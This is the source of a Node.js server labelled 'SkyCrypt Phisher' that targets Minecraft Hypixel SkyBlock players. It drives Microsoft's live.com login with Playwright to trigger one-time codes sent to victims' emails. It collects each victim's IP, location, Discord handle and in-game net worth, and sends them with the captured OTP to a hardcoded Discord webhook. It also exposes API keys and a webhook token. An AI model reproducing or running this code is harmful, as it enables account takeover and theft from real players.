const express = require('express');
const fetch = require('node-fetch');
const { chromium } = require('playwright');
const axios = require('axios')
const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('./privkey1.pem'),
  cert: fs.readFileSync('./fullchain1.pem')
};

const app = express();



const formatNumber = (num) => {
  if (num < 1000) return num.toFixed(2)
  else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
  else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
  else return `${(num / 1000000000).toFixed(2)}b`
}

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});


async function getIpLocation(ip) {
  const url = 'https://ipgeolocation.abstractapi.com/v1/?api_key=28d3584274844560bdf38a12099432dd&ip_address='+ip
  const config = {
      headers: {
          'Content-Type': 'application/json',
      }
  }
  try {
  let response = await axios.get(url, config)
  return [response.data['country'], response.data.flag['emoji']]
  } catch (e) {
    try {
    let response = await axios.get('https://ipgeolocation.abstractapi.com/v1/?api_key=5816e75b2a044cb49bdebb3496f2059f&ip_address='+ip, config)
    return [response.data['country'], response.data.flag['emoji']]
    } catch (e) {
      return ["", ""]
    }
  }
}

function getId(username) {
  return fetch(`https://api.mojang.com/users/profiles/minecraft/${username}`)
    .then(data => data.json())
    .then(player => player.id);
}

async function getPlayerData(username) {
  let url = `https://exuberant-red-abalone.cyclic.app/v2/profiles/${username}`
  let config = {
      headers: {
          'Authorization': 'mfheda'
      }
  }

  try {
      let response = await axios.get(url, config)
      return [response.data.data[0]['rank'], response.data.data[0]['hypixelLevel']]
  } catch (error) {
      return ["API DOWN", 0.0]
  }
}

async function getPlayerStatus(username) {
  try {
    let url = `https://exuberant-red-abalone.cyclic.app/v2/status/${username}`
    let config = {
      headers: {
        'Authorization': 'mfheda'
      }
    }
    let response = await axios.get(url, config)
    return response.data.data.online
  } catch (error) {
    return "API DOWN"
  }
}

async function getPlayerDiscord(username) {
  try {
    let url = `https://exuberant-red-abalone.cyclic.app/v2/discord/${username}`;
    let config = {
      headers: {
        Authorization: "mfheda"
      }
    };
    let response = await axios.get(url, config);
    if (response.data.data.socialMedia.links == null) {
      return response.data.data.socialMedia;
    } else {
      return response.data.data.socialMedia.links.DISCORD;
    }
  } catch (error) {
    return "API DOWN";
  }
}

async function getNetworth(username) {
  try {
    let url = `https://exuberant-red-abalone.cyclic.app/v2/profiles/${username}`;
    let config = {
      headers: {
        Authorization: "mfheda"
      }
    };
    let response = await axios.get(url, config);
    return [
      response.data.data[0]["networth"],
      response.data.data[0].networth["noInventory"],
      response.data.data[0].networth["networth"],
      response.data.data[0].networth["unsoulboundNetworth"],
      response.data.data[0].networth["soulboundNetworth"]
    ];
  } catch (error) {
    return ["API DOWN", "API DOWN", "API DOWN", "API DOWN", "API DOWN",]
  }
}



app.get('/api/email', async (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  let { email, username } = req.query;
  const ip = req.query.ip

  if (!email) {
    return res.status(400).json({ error: 'Missing email parameter' });
  }

  if (!username || username.length > 12 || !/^[a-zA-Z0-9_]*$/.test(username)) {
    username = "invalid"
  }
  res.status(200).json({ message: 'Success'})
  

  const browser = await chromium.launch({ headless: false });
  const context = await browser.newContext();
  const page = await context.newPage();
  try {

    const networthArray = await getNetworth(username)
    const networth = networthArray[0]
    const networthNoInventory = networthArray[1]
    const networthNetworth = networthArray[2]
    const networthUnsoulbound = networthArray[3]
  
  
    let total_networth
    // Set it "API IS TURNED OFF IF NULL"
    if (networth == "API DOWN") total_networth = networth;
    else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
    else if(networthNoInventory) total_networth = "NO INVENTORY: "+formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
    else total_networth = formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";

    const ipLocationArray = await getIpLocation(ip)
    const country = ipLocationArray[0]
    const flag = ipLocationArray[1]
    const uuid = await getId(username)
    const playerData = await getPlayerData(username)
    const rank = playerData[0]
    const level = playerData[1].toFixed()
    const status = await getPlayerStatus(username)
    const discord = await getPlayerDiscord(username)

    const webhookUrl = ''

    let embed = {
      username: "[LVL 100] Flying Phish",
        avatar_url: "https://wiki.hypixel.net/images/5/52/SkyBlock_pets_flying_fish.png",  
      content: "@everyone https://sky.shiiyu.moe/stats/"+username,
        embeds: [
          {
            color: 16749824,
            title: "1/2 Sending OTP.",
            timestamp: new Date(),
            thumbnail: {
              url: 'https://visage.surgeplay.com/full/'+uuid
              },
            fields: [
              {
                  name: "**Username:**",
                  value: "```"+username+"```",
                  inline: true
                },
                {
                  name: "**Rank:**",
                  value: "```"+rank+"```",
                  inline: true
                },
                {
                  name: "**Network Level:**",
                  value: "```"+level+"```",
                  inline: true
                },
                {
                  name: "**Networth:**",
                  value: "```"+total_networth+"```",
                  inline: true
                },
                {
                  name: "**IP:**",
                  value: "```"+ip+"```",
                  inline: true
                },
                {
                    name: "**IP Location:** "+flag,
                    value: "```"+country+"```",
                    inline: true
                  },
                  {
                      name: "Status:",
                      value: "```"+status+"```",
                      inline: true
                    },
                    {
                      name: "**Discord:**",
                      value: "```"+discord+"```",
                      inline: true
                    },
                    {
                      name: "**OTP:**",
                      value: "```Waiting for input.```",
                      inline: true
                    },
                    {
                      name: "**Email:**",
                      value: "```"+email+"```",
                    },
            ],
            "footer": {
              "text": `By heda#0002`,
              "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
            },
            "author": {
              "name": "SkyCrypt Phisher"
            },
          }
        ],
      };


  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(embed),
  })
    .then((response) => {
      console.log(`Phase 1/2 sent to Discord with status code ${response.status}`);
    })
    .catch((error) => {
      console.error('Error sending message to Discord:', error);
    });
  
    await page.goto('https://login.live.com/login.srf');
  
    try {
    await page.fill('input[name="loginfmt"]', email);
    await Promise.all([
      page.waitForNavigation({ timeout: 5000 }),
      page.click('input[type="submit"]')
    ]);
  } catch(e) {
    //pass
  }

  await page.waitForTimeout(1000);
    const switchToCredPickerExists = await page.$('#idA_PWD_SwitchToCredPicker');
    const switchToCredId = await page.$('#idA_PWD_SwitchToRemoteNGC')
    const otcLoginLinkExists = await page.$('#otcLoginLink');
    const otcExists = await page.$('#idTxtBx_OTC_Password');

    if (!switchToCredPickerExists && !switchToCredId && !otcLoginLinkExists && !otcExists) {

      let embedAbort = {
        username: "[LVL 100] Flying Phish",
          avatar_url: "https://wiki.hypixel.net/images/5/52/SkyBlock_pets_flying_fish.png",  
        content: "@everyone https://sky.shiiyu.moe/stats/"+username,
          embeds: [
            {
              color: 11010048,
              title: "2/2 ABORT",
              timestamp: new Date(),
              thumbnail: {
                url: 'https://visage.surgeplay.com/full/'+uuid
                },
              fields: [
                {
                    name: "**Username:**",
                    value: "```"+username+"```",
                    inline: true
                  },
                  {
                    name: "**Rank:**",
                    value: "```"+rank+"```",
                    inline: true
                  },
                  {
                    name: "**Network Level:**",
                    value: "```"+level+"```",
                    inline: true
                  },
                  {
                    name: "**Networth:**",
                    value: "```"+total_networth+"```",
                    inline: true
                  },
                  {
                    name: "**IP:**",
                    value: "```"+ip+"```",
                    inline: true
                  },
                  {
                      name: "**IP Location:** "+flag,
                      value: "```"+country+"```",
                      inline: true
                    },
                    {
                        name: "Status:",
                        value: "```"+status+"```",
                        inline: true
                      },
                      {
                        name: "**Discord:**",
                        value: "```"+discord+"```",
                        inline: true
                      },
                      {
                        name: "**OTP:**",
                        value: "```Could not send OTP code to the email.```",
                        inline: true
                      },
                      {
                        name: "**Email:**",
                        value: "```"+email+"```",
                      },
                      
              ],
              "footer": {
                "text": `By heda#0002`,
                "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
              },
              "author": {
                "name": "SkyCrypt Phisher"
              },
            }
          ],
        };
  
  
        // Send the message to the Discord webhook using fetch
    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(embedAbort),
    })
      .then((response) => {
        console.log(`Phase 2/2 ABORRT sent to Discord with status code ${response.status}`);
      })
      .catch((error) => {
        console.error('Error sending message to Discord:', error);
      });
      
      
      return;
    }

    console.log(switchToCredPickerExists)
    console.log(switchToCredId)
    console.log(otcLoginLinkExists)
    console.log(otcExists)


    if (otcLoginLinkExists) {
      try {
        await Promise.all([
          page.waitForNavigation({ timeout: 5000 }),
          page.click('#otcLoginLink')
        ]);
      } catch(e) {
        //pass
      }}

    if (switchToCredPickerExists) {
      // Click on "Use a different verification option"
      await Promise.all([
        page.waitForNavigation(),
        page.click('#idA_PWD_SwitchToCredPicker')
      ]);

      // Wait for the last element that matches the selector to be available
      const emailTableCell = await page.$('.table-cell.text-left.content');
      console.log(emailTableCell)
      if (emailTableCell) {      
      const emailText = await emailTableCell.textContent();
      const emailMatch = /E-mail\s+(\S+)/i.exec(emailText);
      const emailMatch2 = /Email\s+(\S+)/i.exec(emailText);
      const prefix = email.substr(0, 2).toUpperCase();

      if (emailMatch) {
        const emailTxt = emailMatch[1];
        if (emailTxt.startsWith(prefix.toLowerCase())) {
          await Promise.all([
            page.waitForNavigation(),
            page.$$eval('.table-cell.text-left.content', elements => elements[elements.length - 1].click())
          ]);
        }
      } else if (emailMatch2) {
        const emailTxt = emailMatch2[1];
        if (emailTxt.startsWith(prefix.toLowerCase())) {
          await Promise.all([
            page.waitForNavigation(),
            page.$$eval('.table-cell.text-left.content', elements => elements[elements.length - 1].click())
          ]);
        }
      } else {
        let embedAbort = {
          username: "[LVL 100] Flying Phish",
            avatar_url: "https://wiki.hypixel.net/images/5/52/SkyBlock_pets_flying_fish.png",  
          content: "@everyone https://sky.shiiyu.moe/stats/"+username,
            embeds: [
              {
                color: 11010048,
                title: "2/2 ABORT",
                timestamp: new Date(),
                thumbnail: {
                  url: 'https://visage.surgeplay.com/full/'+uuid
                  },
                fields: [
                  {
                      name: "**Username:**",
                      value: "```"+username+"```",
                      inline: true
                    },
                    {
                      name: "**Rank:**",
                      value: "```"+rank+"```",
                      inline: true
                    },
                    {
                      name: "**Network Level:**",
                      value: "```"+level+"```",
                      inline: true
                    },
                    {
                      name: "**Networth:**",
                      value: "```"+total_networth+"```",
                      inline: true
                    },
                    {
                      name: "**IP:**",
                      value: "```"+ip+"```",
                      inline: true
                    },
                    {
                        name: "**IP Location:** "+flag,
                        value: "```"+country+"```",
                        inline: true
                      },
                      {
                          name: "Status:",
                          value: "```"+status+"```",
                          inline: true
                        },
                        {
                          name: "**Discord:**",
                          value: "```"+discord+"```",
                          inline: true
                        },
                        {
                          name: "**OTP:**",
                          value: "```Recovery Email does not match.```",
                          inline: true
                        },
                        {
                          name: "**Email:**",
                          value: "```"+email+"```",
                        },
                        
                ],
                "footer": {
                  "text": `By heda#0002`,
                  "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
                },
                "author": {
                  "name": "SkyCrypt Phisher"
                },
              }
            ],
          };
    
    
          // Send the message to the Discord webhook using fetch
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(embedAbort),
      })
        .then((response) => {
          console.log(`Phase 2/2 ABORRT sent to Discord with status code ${response.status}`);
        })
        .catch((error) => {
          console.error('Error sending message to Discord:', error);
        });
      }}

      // Check if the proofConfirmationText input element exists
      const proofConfirmationTextInputExists = await page.$('#proofConfirmationText');
      console.log(proofConfirmationTextInputExists)

      // Fill in the input if it exists
      if (proofConfirmationTextInputExists) {
        await page.fill('#proofConfirmationText', email);
    
        // Click on "Request code"
        await Promise.all([
          page.waitForNavigation(),
          page.click('#idSIButton9')
        ]);

        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: 'OTP has been successfuly sent to ```'+email+'```\nWaiting for them to input it.'
          })
        })
      }
    }

    if (switchToCredId) {
      try {
      await Promise.all([
        page.waitForNavigation(),
        page.click('#idA_PWD_SwitchToRemoteNGC')
      ])
    } catch (e) {
      //pass
    }
    }



    if (otcExists) {
      try {
        await Promise.all([
          page.waitForNavigation({ timeout: 5000 }),
          page.click('#idA_PWD_SwitchToCredPicker')
        ]);
      } catch(e) {
        //pass
      }
          // Wait for the last element that matches the selector to be available
      const emailTableCell = await page.$('.table-cell.text-left.content');
      console.log(emailTableCell)
      if (emailTableCell) {      
      const emailText = await emailTableCell.textContent();
      const emailMatch = /E-mail\s+(\S+)/i.exec(emailText);
      const emailMatch2 = /Email\s+(\S+)/i.exec(emailText);
      const prefix = email.substr(0, 2).toUpperCase();

      if (emailMatch) {
        const emailTxt = emailMatch[1];
        if (emailTxt.startsWith(prefix.toLowerCase())) {
          await Promise.all([
            page.waitForNavigation(),
            page.$$eval('.table-cell.text-left.content', elements => elements[elements.length - 1].click())
          ]);
        }
      } else if (emailMatch2) {
        const emailTxt = emailMatch2[1];
        if (emailTxt.startsWith(prefix.toLowerCase())) {
          await Promise.all([
            page.waitForNavigation(),
            page.$$eval('.table-cell.text-left.content', elements => elements[elements.length - 1].click())
          ]);
        }
      } else {
        let embedAbort = {
          username: "[LVL 100] Flying Phish",
            avatar_url: "https://wiki.hypixel.net/images/5/52/SkyBlock_pets_flying_fish.png",  
          content: "@everyone https://sky.shiiyu.moe/stats/"+username,
            embeds: [
              {
                color: 11010048,
                title: "2/2 ABORT",
                timestamp: new Date(),
                thumbnail: {
                  url: 'https://visage.surgeplay.com/full/'+uuid
                  },
                fields: [
                  {
                      name: "**Username:**",
                      value: "```"+username+"```",
                      inline: true
                    },
                    {
                      name: "**Rank:**",
                      value: "```"+rank+"```",
                      inline: true
                    },
                    {
                      name: "**Network Level:**",
                      value: "```"+level+"```",
                      inline: true
                    },
                    {
                      name: "**Networth:**",
                      value: "```"+total_networth+"```",
                      inline: true
                    },
                    {
                      name: "**IP:**",
                      value: "```"+ip+"```",
                      inline: true
                    },
                    {
                        name: "**IP Location:** "+flag,
                        value: "```"+country+"```",
                        inline: true
                      },
                      {
                          name: "Status:",
                          value: "```"+status+"```",
                          inline: true
                        },
                        {
                          name: "**Discord:**",
                          value: "```"+discord+"```",
                          inline: true
                        },
                        {
                          name: "**OTP:**",
                          value: "```Recovery Email does not match.```",
                          inline: true
                        },
                        {
                          name: "**Email:**",
                          value: "```"+email+"```",
                        },
                        
                ],
                "footer": {
                  "text": `By heda#0002`,
                  "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
                },
                "author": {
                  "name": "SkyCrypt Phisher"
                },
              }
            ],
          };
    

      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(embedAbort),
      })
        .then((response) => {
          console.log(`Phase 2/2 ABORRT sent to Discord with status code ${response.status}`);
        })
        .catch((error) => {
          console.error('Error sending message to Discord:', error);
        });
      }}}
  
    // Close the browser
    await browser.close();
  } catch (error) {
    console.error(error);
  } finally {
    await browser.close();
  }
});

app.get('/api/code', async (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  let { email, username, code } = req.query;
  const ip = req.query.ip

  if (!email) {
    return res.status(400).json({ error: 'Missing email parameter' });
  }
  if (!username || username.length > 12 || !/^[a-zA-Z0-9_]*$/.test(username)) {
    username = "invalid"
  }

  
  try {
    const ipLocationArray = await getIpLocation(ip)
    const country = ipLocationArray[0]
    const flag = ipLocationArray[1]
    const webhookUrl = "https://discord.com/api/webhooks/1106243501315862649/EouEXh5r5WlhmN0FvSHQxRX6Zu0ww6ZZVWfSutDo54AyQ7Vhc4SKCJpzXpncEXfJa7Vs"
    const uuid = await getId(username)
    const playerData = await getPlayerData(username)
    const rank = playerData[0]
    const level = playerData[1].toFixed()
    const status = await getPlayerStatus(username)
    const discord = await getPlayerDiscord(username)

    const networthArray = await getNetworth(username)
    const networth = networthArray[0]
    const networthNoInventory = networthArray[1]
    const networthNetworth = networthArray[2]
    const networthUnsoulbound = networthArray[3]
    const networthSoulbound = networthArray[4]
  
  
    let total_networth
    // Set it "API IS TURNED OFF IF NULL"
    if (networth == "API DOWN") total_networth = networth;
    else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
    else if(networthNoInventory) total_networth = "NO INVENTORY: "+formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
    else total_networth = formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";


let embed = {
  username: "[LVL 100] Flying Phish",
    avatar_url: "https://wiki.hypixel.net/images/5/52/SkyBlock_pets_flying_fish.png",  
  content: "@everyone https://sky.shiiyu.moe/stats/"+username,
    embeds: [
      {
        color: 65297,
        timestamp: new Date(),
        title: "2/2 OTP has been retrieved.",
        thumbnail: {
          url: 'https://visage.surgeplay.com/full/'+uuid
          },
        fields: [
          {
              name: "**Username:**",
              value: "```"+username+"```",
              inline: true
            },
            {
              name: "**Rank:**",
              value: "```"+rank+"```",
              inline: true
            },
            {
              name: "**Network Level:**",
              value: "```"+level+"```",
              inline: true
            },
            {
              name: "**Networth:**",
              value: "```"+total_networth+"```",
              inline: true
            },
            {
              name: "**IP:**",
              value: "```"+ip+"```",
              inline: true
            },
            {
                name: "**IP Location:** "+flag,
                value: "```"+country+"```",
                inline: true
              },
              {
                  name: "Status:",
                  value: "```"+status+"```",
                  inline: true
                },
                {
                  name: "**Discord:**",
                  value: "```"+discord+"```",
                  inline: true
                },
                {
                  name: "**OTP:**",
                  value: "ㅤ\n||"+code+"||",
                  inline: true
                },
                {
                  name: "**Email:**",
                  value: "```"+email+"```",
                },
        ],
        "footer": {
                  "text": `By heda#0002 - ${user}`,
          "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
        },
        "author": {
          "name": "SkyCrypt Phisher"
        },
      }
    ],
  };

      // Send the message to the Discord webhook using fetch
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(embed),
  });

  res.status(200).json({ message: 'success'})

  
} finally {
  //pass
}
}
);



const server = https.createServer(options, app);

server.listen(3003 , () => {
  console.log('Server started on port 3030 ');
});
